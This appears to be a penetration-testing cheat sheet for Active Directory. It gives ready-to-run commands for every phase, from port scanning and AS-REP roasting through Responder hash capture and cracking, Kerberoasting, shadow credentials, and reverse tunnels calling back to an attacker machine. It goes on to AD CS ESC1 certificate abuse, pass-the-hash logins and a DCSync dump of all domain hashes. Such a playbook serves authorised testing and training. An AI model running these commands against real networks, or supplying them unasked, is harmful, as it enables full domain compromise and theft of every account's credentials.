# Windows & Active Directory Penetration Testing Methodology

This methodology outlines the standard workflow for escalating from unauthenticated external access to full Domain Compromise in a modern Active Directory environment, heavily emphasizing AD CS (Active Directory Certificate Services) and internal pivoting.

## Phase 1: External Recon & Share Enumeration

**Goal:** Find entry points, exposed data, or users that don't require pre-authentication.

### 1. Port Scanning
```bash
nmap -p- --min-rate 5000 <IP>
nmap -p 80,443,445,3389,5985 -sC -sV <IP>
```

### 2. Anonymous SMB / Null Session Check
```bash
netexec smb <IP> -u '' -p '' --shares
```

### 3. AS-REP Roasting (No initial credentials needed)
```bash
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -request -format hashcat
```

## Phase 2: The Bridge (Catching Hashes & Poisoning)

**Goal:** Coerce the server or network to send you a NetNTLMv1/v2 hash for cracking.

### 1. Start Responder Listener
Listens for LLMNR, NBT-NS, and MDNS poisoning, or catches coerced authentication.
```bash
sudo responder -I tun0 -rdw
```

### 2. Crack the Caught Hash
Once Responder catches a hash, save it to a file and crack it.
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## Phase 3: Internal Recon (The BloodHound Phase)

**Goal:** Map the domain using your newly acquired or cracked credentials to find escalation paths.

### 1. Validate Credentials Across the Subnet
```bash
netexec smb <SUBNET_OR_IP> -u '<USER>' -p '<PASSWORD>'
```

### 2. Collect Active Directory Data
```bash
bloodhound-python -u '<USER>' -p '<PASSWORD>' -ns <DC_IP> -d <DOMAIN> -c all
```
(Import the resulting JSON files into your BloodHound GUI)

## Phase 4: Lateral Movement (Abusing ACLs)

**Goal:** Exploit misconfigured permissions (e.g., GenericWrite) found in BloodHound to take over higher-tier service accounts.

### Option A: Targeted Kerberoasting (Requires WriteProperty/GenericWrite)

Set a fake SPN on the target account:
```bash
python3 addspn.py -u '<USER>' -p '<PASSWORD>' -target '<TARGET_ACCOUNT>' -s 'HTTP/fake.local' <DOMAIN>
```

Request the Kerberos ticket for cracking:
```bash
impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -request
```

### Option B: Shadow Credentials (Requires GenericWrite/WriteDacl)
```bash
certipy-ad shadow auto -u '<USER>' -p '<PASSWORD>' -account '<TARGET_ACCOUNT>' -dc-ip <DC_IP>
```

## Phase 5: Pivoting & Internal Access

**Goal:** Route your attack traffic through a compromised machine to reach internal subnets or isolated Domain Controllers.

### Option A: Ligolo-ng (Modern, route-based)

1. On Kali: Setup interface and start proxy server
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

2. On Target Windows Machine: Run the agent
```powershell
.\agent.exe -connect <KALI_IP>:11601 -ignore-cert
```

3. On Kali: Inside the proxy interactive prompt, start routing
```bash
session -> 1 -> start
sudo ip route add <INTERNAL_SUBNET>/24 dev ligolo
```

### Option B: Chisel (Classic, SOCKS5 proxy)

1. On Kali: Start the server
```bash
chisel server -p 8000 --reverse
```

2. On Target Windows Machine: Connect back
```powershell
.\chisel.exe client <KALI_IP>:8000 R:socks
```

3. On Kali: Prepend commands with proxychains
```bash
proxychains certipy-ad find ...
```

## Phase 6: AD CS Escalation (Owning the Domain)

**Goal:** Audit Certificate Services and exploit vulnerable templates (like ESC1) to impersonate a Domain Admin.

### 1. Enumerate Vulnerable Templates
```bash
certipy-ad find -u '<USER>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout
```

### 2. Request a Certificate as Administrator (ESC1)
```bash
certipy-ad req -u '<USER>' -p '<PASSWORD>' -ca <CA_NAME> -template <VULN_TEMPLATE> -upn administrator@<DOMAIN> -target <DC_IP>
```

### 3. Authenticate and Extract the NT Hash
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <DOMAIN>
```

## Phase 7: Execution & Dumping Secrets

**Goal:** Use the Administrator NT hash to gain a high-privileged shell and dump the NTDS.dit file.

### 1. Log in via WinRM (Pass-the-Hash)
(Note: Only use the NT portion of the hash, meaning everything after the colon `:`. Do not use the `LM:NT` format).
```bash
evil-winrm -i <DC_IP> -u administrator -H <NT_HASH_ONLY>
```

### 2. DCSync (Extract all domain hashes)
```bash
impacket-secretsdump <DOMAIN>/administrator@<DC_IP> -hashes :<NT_HASH_ONLY>
```
